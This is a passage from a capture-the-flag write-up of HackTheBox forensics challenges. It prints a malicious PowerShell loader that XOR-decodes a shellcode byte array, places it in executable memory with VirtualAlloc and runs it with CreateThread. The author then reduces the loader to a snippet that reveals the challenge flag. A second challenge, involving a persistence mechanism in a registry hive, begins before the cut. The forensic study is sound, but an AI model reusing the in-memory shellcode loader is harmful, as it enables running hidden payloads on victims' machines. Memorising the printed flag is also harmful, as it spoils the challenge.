class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage1</span> = <span class="number">0</span>x99, <span class="number">0</span>x85, <span class="number">0</span>x93, <span class="number">0</span>xaa, <span class="number">0</span>xb3, <span class="number">0</span>xe2, <span class="number">0</span>xa6, <span class="number">0</span>xb9, <span class="number">0</span>xe5, <span class="number">0</span>xa3, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xe1, <span class="number">0</span>xb7, <span class="number">0</span>x8e, <span class="number">0</span>xa5, <span class="number">0</span>xb9, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xb3;</span><br><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage2</span> = <span class="number">0</span>xac, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xe2, <span class="number">0</span>xb2, <span class="number">0</span>xe0, <span class="number">0</span>xa5, <span class="number">0</span>xa2, <span class="number">0</span>xa4, <span class="number">0</span>xbb, <span class="number">0</span>x8e, <span class="number">0</span>xb7, <span class="number">0</span>xe1, <span class="number">0</span>x8e, <span class="number">0</span>xe4, <span class="number">0</span>xa5, <span class="number">0</span>xe1, <span class="number">0</span>xe1;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tNZvQCljVk</span> = <span class="built_in">Add-Type</span> <span class="literal">-memberDefinition</span> <span class="variable">$OleSPrlmhB</span> <span class="literal">-Name</span> <span class="string">&quot;Win32&quot;</span> <span class="literal">-namespace</span> Win32Functions <span class="literal">-passthru</span>;</span><br><span class="line"></span><br><span class="line">[<span class="built_in">Byte</span>[]] <span class="variable">$HVOASfFuNSxRXR</span> = <span class="number">0</span>x2d,<span class="number">0</span>x99,<span class="number">0</span>x52,<span class="number">0</span>x35,<span class="number">0</span>x21,<span class="number">0</span>x39,<span class="number">0</span>x1d,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x90,<span class="number">0</span>x80,<span class="number">0</span>x90,<span class="number">0</span>x81,<span class="number">0</span>x83,<span class="number">0</span>x99,<span class="number">0</span>xe0,<span class="number">0</span>x03,<span class="number">0</span>xb4,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>x83,<span class="number">0</span>xb1,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>x83,<span class="number">0</span>xc9,<span class="number">0</span>x80,<span class="number">0</span>x87,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>x83,<span class="number">0</span>xf1,<span class="number">0</span>x99,<span class="number">0</span>xde,<span class="number">0</span>x66,<span class="number">0</span>x9b,<span class="number">0</span>x9b,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>xa3,<span class="number">0</span>x81,<span class="number">0</span>x99,<span class="number">0</span>xe0,<span class="number">0</span>x11,<span class="number">0</span>x7d,<span class="number">0</span>xed,<span class="number">0</span>xb0,<span class="number">0</span>xad,<span class="number">0</span>xd3,<span class="number">0</span>xfd,<span class="number">0</span>xf1,<span class="number">0</span>x90,<span class="number">0</span>x10,<span class="number">0</span>x18,<span class="number">0</span>xdc,<span class="number">0</span>x90,<span class="number">0</span>xd0,<span class="number">0</span>x10,<span class="number">0</span>x33,<span class="number">0</span>x3c,<span class="number">0</span>x83,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>x83,<span class="number">0</span>xf1,<span class="number">0</span>x90,<span class="number">0</span>x80,<span class="number">0</span>x5a,<span class="number">0</span>x93,<span class="number">0</span>xed,<span class="number">0</span>x99,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>xb7,<span class="number">0</span>x50,<span class="number">0</span>xa9,<span class="number">0</span>xc9,<span class="number">0</span>xda,<span class="number">0</span>xd3,<span class="number">0</span>xde,<span class="number">0</span>x54,<span class="number">0</span>xa3,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x5a,<span class="number">0</span>x51,<span class="number">0</span>x59,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x99,<span class="number">0</span>x54,<span class="number">0</span>x11,<span class="number">0</span>xa5,<span class="number">0</span>xb6,<span class="number">0</span>x99,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>x5a,<span class="number">0</span>x99,<span class="number">0</span>xc9,<span class="number">0</span>x81,<span class="number">0</span>x95,<span class="number">0</span>x5a,<span class="number">0</span>x91,<span class="number">0</span>xf1,<span class="number">0</span>x98,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>x32,<span class="number">0</span>x87,<span class="number">0</span>x99,<span class="number">0</span>x2e,<span class="number">0</span>x18,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>x90,<span class="number">0</span>x5a,<span class="number">0</span>xe5,<span class="number">0</span>x59,<span class="number">0</span>x99,<span class="number">0</span>xd0,<span class="number">0</span>x07,<span class="number">0</span>x99,<span class="number">0</span>xe0,<span class="number">0</span>x11,<span class="number">0</span>x90,<span class="number">0</span>x10,<span class="number">0</span>x18,<span class="number">0</span>xdc,<span class="number">0</span>x7d,<span class="number">0</span>x90,<span class="number">0</span>xd0,<span class="number">0</span>x10,<span class="number">0</span>xe9,<span class="number">0</span>x31,<span class="number">0</span>xa4,<span class="number">0</span>x20,<span class="number">0</span>x9d,<span class="number">0</span>xd2,<span class="number">0</span>x9d,<span class="number">0</span>xf5,<span class="number">0</span>xd9,<span class="number">0</span>x94,<span class="number">0</span>xe8,<span class="number">0</span>x00,<span class="number">0</span>xa4,<span class="number">0</span>x09,<span class="number">0</span>x89,<span class="number">0</span>x95,<span class="number">0</span>x5a,<span class="number">0</span>x91,<span class="number">0</span>xf5,<span class="number">0</span>x98,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>xb7,<span class="number">0</span>x90,<span class="number">0</span>x5a,<span class="number">0</span>xdd,<span class="number">0</span>x99,<span class="number">0</span>x95,<span class="number">0</span>x5a,<span class="number">0</span>x91,<span class="number">0</span>xcd,<span class="number">0</span>x98,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>x90,<span class="number">0</span>x5a,<span class="number">0</span>xd5,<span class="number">0</span>x59,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x8f,<span class="number">0</span>x88,<span class="number">0</span>x99,<span class="number">0</span>xd0,<span class="number">0</span>x01,<span class="number">0</span>x8b,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x90,<span class="number">0</span>x88,<span class="number">0</span>x90,<span class="number">0</span>x8b,<span class="number">0</span>x99,<span class="number">0</span>x52,<span class="number">0</span>x3d,<span class="number">0</span>xf1,<span class="number">0</span>x90,<span class="number">0</span>x83,<span class="number">0</span>x2e,<span class="number">0</span>x31,<span class="number">0</span>x89,<span class="number">0</span>x90,<span class="number">0</span>x88,<span class="number">0</span>x8b,<span class="number">0</span>x99,<span class="number">0</span>x5a,<span class="number">0</span>xc3,<span class="number">0</span>x38,<span class="number">0</span>x9a,<span class="number">0</span>x2e,<span class="number">0</span>x2e,<span class="number">0</span>x2e,<span class="number">0</span>x8c,<span class="number">0</span>x98,<span class="number">0</span>x6f,<span class="number">0</span>xa6,<span class="number">0</span>xa2,<span class="number">0</span>xe3,<span class="number">0</span>x8e,<span class="number">0</span>xe2,<span class="number">0</span>xe3,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x90,<span class="number">0</span>x87,<span class="number">0</span>x98,<span class="number">0</span>x58,<span class="number">0</span>x37,<span class="number">0</span>x99,<span class="number">0</span>x50,<span class="number">0</span>x3d,<span class="number">0</span>x71,<span class="number">0</span>xd0,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x98,<span class="number">0</span>x58,<span class="number">0</span>x34,<span class="number">0</span>x98,<span class="number">0</span>x6d,<span class="number">0</span>xd3,<span class="number">0</span>xd1,<span class="number">0</span>xd4,<span class="number">0</span>xe8,<span class="number">0</span>x11,<span class="number">0</span>x79,<span class="number">0</span>xd1,<span class="number">0</span>xc3,<span class="number">0</span>x90,<span class="number">0</span>x85,<span class="number">0</span>x98,<span class="number">0</span>x58,<span class="number">0</span>x35,<span class="number">0</span>x9d,<span class="number">0</span>x58,<span class="number">0</span>x20,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>x9d,<span class="number">0</span>xa6,<span class="number">0</span>xf7,<span class="number">0</span>xd6,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x9d,<span class="number">0</span>x58,<span class="number">0</span>x3b,<span class="number">0</span>xb9,<span class="number">0</span>xd0,<span class="number">0</span>xd0,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x88,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>xf8,<span class="number">0</span>x51,<span class="number">0</span>xba,<span class="number">0</span>xd1,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>xbb,<span class="number">0</span>xdb,<span class="number">0</span>x90,<span class="number">0</span>x8f,<span class="number">0</span>x81,<span class="number">0</span>x81,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x11,<span class="number">0</span>x99,<span class="number">0</span>x2e,<span class="number">0</span>x11,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x13,<span class="number">0</span>x99,<span class="number">0</span>x2e,<span class="number">0</span>x11,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x10,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>x3b,<span class="number">0</span>xde,<span class="number">0</span>x0e,<span class="number">0</span>x31,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x16,<span class="number">0</span>xbb,<span class="number">0</span>xc1,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x9d,<span class="number">0</span>x58,<span class="number">0</span>x33,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x28,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>x48,<span class="number">0</span>x74,<span class="number">0</span>xa5,<span class="number">0</span>xb0,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x54,<span class="number">0</span>x11,<span class="number">0</span>xa5,<span class="number">0</span>xdb,<span class="number">0</span>x98,<span class="number">0</span>x2e,<span class="number">0</span>x1f,<span class="number">0</span>xa4,<span class="number">0</span>x34,<span class="number">0</span>x39,<span class="number">0</span>x42,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x99,<span class="number">0</span>x52,<span class="number">0</span>x3d,<span class="number">0</span>xc1,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x33,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>xbb,<span class="number">0</span>xd5,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x28,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>xd3,<span class="number">0</span>x08,<span class="number">0</span>x19,<span class="number">0</span>x8e,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x52,<span class="number">0</span>x29,<span class="number">0</span>xd1,<span class="number">0</span>xaf,<span class="number">0</span>x84,<span class="number">0</span>x99,<span class="number">0</span>x52,<span class="number">0</span>x15,<span class="number">0</span>xf1,<span class="number">0</span>x8f,<span class="number">0</span>x58,<span class="number">0</span>x27,<span class="number">0</span>xbb,<span class="number">0</span>x91,<span class="number">0</span>x90,<span class="number">0</span>x88,<span class="number">0</span>xb9,<span class="number">0</span>xd1,<span class="number">0</span>xc1,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x23,<span class="number">0</span>x99,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>x89,<span class="number">0</span>x75,<span class="number">0</span>x82,<span class="number">0</span>x34,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x12,<span class="number">0</span>x98,<span class="number">0</span>x58,<span class="number">0</span>x16,<span class="number">0</span>x9c,<span class="number">0</span>xe0,<span class="number">0</span>x18,<span class="number">0</span>x98,<span class="number">0</span>x58,<span class="number">0</span>x21,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x0b,<span class="number">0</span>x99,<span class="number">0</span>x58,<span class="number">0</span>x28,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>xd3,<span class="number">0</span>x08,<span class="number">0</span>x19,<span class="number">0</span>x8e,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x52,<span class="number">0</span>x29,<span class="number">0</span>xd1,<span class="number">0</span>xac,<span class="number">0</span>xf9,<span class="number">0</span>x89,<span class="number">0</span>x90,<span class="number">0</span>x86,<span class="number">0</span>x88,<span class="number">0</span>xb9,<span class="number">0</span>xd1,<span class="number">0</span>x91,<span class="number">0</span>xd1,<span class="number">0</span>xd1,<span class="number">0</span>x90,<span class="number">0</span>x89,<span class="number">0</span>xbb,<span class="number">0</span>xd1,<span class="number">0</span>x8b,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>xda,<span class="number">0</span>xfe,<span class="number">0</span>xde,<span class="number">0</span>xe1,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x86,<span class="number">0</span>x88,<span class="number">0</span>x90,<span class="number">0</span>x6b,<span class="number">0</span>xa4,<span class="number">0</span>xbf,<span class="number">0</span>x9c,<span class="number">0</span>xb0,<span class="number">0</span>x2e,<span class="number">0</span>x04,<span class="number">0</span>x98,<span class="number">0</span>x2e,<span class="number">0</span>x1f,<span class="number">0</span>x38,<span class="number">0</span>xed,<span class="number">0</span>x2e,<span class="number">0</span>x2e,<span class="number">0</span>x2e,<span class="number">0</span>x99,<span class="number">0</span>xd0,<span class="number">0</span>x12,<span class="number">0</span>x99,<span class="number">0</span>xf8,<span class="number">0</span>x17,<span class="number">0</span>x99,<span class="number">0</span>x54,<span class="number">0</span>x27,<span class="number">0</span>xa4,<span class="number">0</span>x65,<span class="number">0</span>x90,<span class="number">0</span>x2e,<span class="number">0</span>x36,<span class="number">0</span>x89,<span class="number">0</span>xbb,<span class="number">0</span>xd1,<span class="number">0</span>x88,<span class="number">0</span>x98,<span class="number">0</span>x16,<span class="number">0</span>x13,<span class="number">0</span>x21,<span class="number">0</span>x64,<span class="number">0</span>x73,<span class="number">0</span>x87,<span class="number">0</span>x2e,<span class="number">0</span>x04;</span><br><span class="line"></span><br><span class="line">[<span class="built_in">array</span>]::Reverse(<span class="variable">$stage2</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$hRffYLENA</span> = <span class="variable">$tNZvQCljVk::VirtualAlloc</span>(<span class="number">0</span>,[<span class="type">Math</span>]::Max(<span class="variable">$HVOASfFuNSxRXR</span>.Length,<span class="number">0</span>x1000),<span class="number">0</span>x3000,<span class="number">0</span>x40);</span><br><span class="line"></span><br><span class="line"><span class="variable">$stage3</span> = <span class="variable">$stage1</span> + <span class="variable">$stage2</span>;</span><br><span class="line"></span><br><span class="line">[<span class="type">System.Runtime.InteropServices.Marshal</span>]::<span class="built_in">Copy</span>(<span class="variable">$HVOASfFuNSxRXR</span>,<span class="number">0</span>,<span class="variable">$hRffYLENA</span>,<span class="variable">$HVOASfFuNSxRXR</span>.Length);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Unpack Shellcode;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$HVOASfFuNSxRXR</span>.count ; <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$HVOASfFuNSxRXR</span>[<span class="variable">$i</span>] = <span class="variable">$HVOASfFuNSxRXR</span>[<span class="variable">$i</span>] <span class="operator">-bxor</span> <span class="number">0</span>xd1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#Unpack Special Orders!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$stage3</span>.count;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$stage3</span>[<span class="variable">$i</span>] = <span class="variable">$stage3</span>[<span class="variable">$i</span>] <span class="operator">-bxor</span> <span class="number">0</span>xd1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tNZvQCljVk::CreateThread</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="variable">$hRffYLENA</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>Basically, it’s taking <code>stage1</code> and <code>stage2</code> </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage1</span> = <span class="number">0</span>x99, <span class="number">0</span>x85, <span class="number">0</span>x93, <span class="number">0</span>xaa, <span class="number">0</span>xb3, <span class="number">0</span>xe2, <span class="number">0</span>xa6, <span class="number">0</span>xb9, <span class="number">0</span>xe5, <span class="number">0</span>xa3, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xe1, <span class="number">0</span>xb7, <span class="number">0</span>x8e, <span class="number">0</span>xa5, <span class="number">0</span>xb9, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xb3;</span><br><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage2</span> = <span class="number">0</span>xac, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xe2, <span class="number">0</span>xb2, <span class="number">0</span>xe0, <span class="number">0</span>xa5, <span class="number">0</span>xa2, <span class="number">0</span>xa4, <span class="number">0</span>xbb, <span class="number">0</span>x8e, <span class="number">0</span>xb7, <span class="number">0</span>xe1, <span class="number">0</span>x8e, <span class="number">0</span>xe4, <span class="number">0</span>xa5, <span class="number">0</span>xe1, <span class="number">0</span>xe1;</span><br></pre></td></tr></table></figure><p>then reversing <code>stage2</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">array</span>]::Reverse(<span class="variable">$stage2</span>);</span><br></pre></td></tr></table></figure><p> and adding them in another variable called <code>stage3</code> </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stage3</span> = <span class="variable">$stage1</span> + <span class="variable">$stage2</span>;</span><br></pre></td></tr></table></figure><p>After that it’s looping through <code>stage3</code> and xoring with <code>0xd1</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$stage3</span>.count;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$stage3</span>[<span class="variable">$i</span>] = <span class="variable">$stage3</span>[<span class="variable">$i</span>] <span class="operator">-bxor</span> <span class="number">0</span>xd1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I assumed that the flag is in the variable <code>stage3</code> so I edited the script a little bit by commenting some parts that we don’t actually need , finally, I printed the variable <code>stage3</code> .</p><p>This is the final script:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage1</span> = <span class="number">0</span>x99, <span class="number">0</span>x85, <span class="number">0</span>x93, <span class="number">0</span>xaa, <span class="number">0</span>xb3, <span class="number">0</span>xe2, <span class="number">0</span>xa6, <span class="number">0</span>xb9, <span class="number">0</span>xe5, <span class="number">0</span>xa3, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xe1, <span class="number">0</span>xb7, <span class="number">0</span>x8e, <span class="number">0</span>xa5, <span class="number">0</span>xb9, <span class="number">0</span>xe2, <span class="number">0</span>x8e, <span class="number">0</span>xb3;</span><br><span class="line">[<span class="built_in">byte</span>[]] <span class="variable">$stage2</span> = <span class="number">0</span>xac, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xff, <span class="number">0</span>xe2, <span class="number">0</span>xb2, <span class="number">0</span>xe0, <span class="number">0</span>xa5, <span class="number">0</span>xa2, <span class="number">0</span>xa4, <span class="number">0</span>xbb, <span class="number">0</span>x8e, <span class="number">0</span>xb7, <span class="number">0</span>xe1, <span class="number">0</span>x8e, <span class="number">0</span>xe4, <span class="number">0</span>xa5, <span class="number">0</span>xe1, <span class="number">0</span>xe1;</span><br><span class="line">[<span class="built_in">array</span>]::Reverse(<span class="variable">$stage2</span>);</span><br><span class="line"><span class="variable">$stage3</span> = <span class="variable">$stage1</span> + <span class="variable">$stage2</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$stage3</span>.count;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$stage3</span>[<span class="variable">$i</span>] = <span class="variable">$stage3</span>[<span class="variable">$i</span>] <span class="operator">-bxor</span> <span class="number">0</span>xd1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$stage3</span></span><br></pre></td></tr></table></figure><p>After running the script using the command <code>pwsh</code> in linux (note that we can also run it in windows PowerShell) we get the following result.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd081ae28-e4a4-4c68-bdfc-614df8a40ab4%2FUntitled.png?id=c9feb65a-71fb-4953-afa7-e08952c908f3&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1190&userId=&cache=v2" alt="forensics"></p><p>They are ascii values , I threw them into CyberChef and look what we have found!</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F254effab-931d-4273-8306-2633ac07b0b1%2FUntitled.png?id=e965daf5-28c7-4a15-b7ee-3d2debf52be3&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>We got our flag!</p><p><code>Flag : HTB&#123;b3wh4r3_0f_th3_b00t5_0f_just1c3...&#125;</code></p><hr><h2 id="Golden-Persistence"><a href="#Golden-Persistence" class="headerlink" title="Golden Persistence"></a>Golden Persistence</h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Emergency! A space station near Urkir was compromised. Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in. Thus, there are now fears that the intergalactic war will also affect this neutral planet. If Draeger and his mercenaries manage to maintain unauthorised access in Urkir&#x27;s space station and escalate their privileges, they will soon be able to activate the station&#x27;s defence mechanisms that are able to prevent any spaceship from entering Urkir&#x27;s airspace. For now, the infected machine is isolated until the case is closed. Help Miyuki find their persistence mechanisms so they cannot gain access again.</span><br></pre></td></tr></table></figure><p>We are given a NTUSER.DAT file </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Feb57080f-af83-4429-9c02-c630ce29b5ca%2FUntitled.png?id=ffcf33e0-a0c0-4e7b-a10a-00070f2c7897&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1240&userId=&cache=v2" alt="forensics"></p><p>In order to explore the file I used <code>regripper</code> tool in linux</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F27a78e3a-bb0f-42a8-b7b6-65dafcf2ff10%2FUntitled.png?id=b1cd6477-ff47-4472-8f48-d16f663c5859&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1110&userId=&cache=v2" alt="forensics"></p><p>we just need to give our <em>NTUSER.DAT</em> file and specify a name of a file to write the output in then for the plugin file option just choose <strong>ntuser-all.</strong> Finally, hit <strong>Rip it</strong></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F792537d3-29c9-4a70-a8cf-62ace131b644%2FUntitled.png?id=73a8c3cf-ec80-4885-bf32-f40f8c3ff632&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1010&userId=&cache=v2" alt="forensics"></p><p>It will finish the process after some time , now if we take a look at our output.txt file we can see many data written to it.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4046bf19-1abd-4390-abcb-c6c160bc26ae%2FUntitled.png?id=0c70c9b5-2644-4d33-9451-e2d46daf05c2&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>Most of the data are not much of interest but if we scroll down we can find this line right here </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F83cc1139-d637-4b37-b8ad-aa154ef63a79%2FUntitled.png?id=e602a0cc-b72c-45cb-ba4e-07e8dc395228&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="forensics"></p><p>there is a base64 encoded string after the <code>-enc</code> tag.</p><p>I saved it in another file and decoded it using the <code>base64 -d</code> command and saved the output in a file called <strong>decoded.txt</strong></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb2583e4d-64e9-423a-8696-f9e268943fee%2FUntitled.png?id=35eb1505-5d53-448f-a18c-e80e2fd067bb&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1210&userId=&cache=v2" alt="forensics"></p><p>Let’s have a look at it</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Faa9d8ba5-9da3-45de-9638-54ff5d82876b%2FUntitled.png?id=c24f1057-c011-4844-af32-5171841f5281&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1600&userId=&cache=v2" alt="forensics"></p><p>It’s a PowerShell script so let’s rename it to <code>script.ps1</code> since the extension of a PowerShell script is <code>.ps1</code></p><p>This is the full script </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 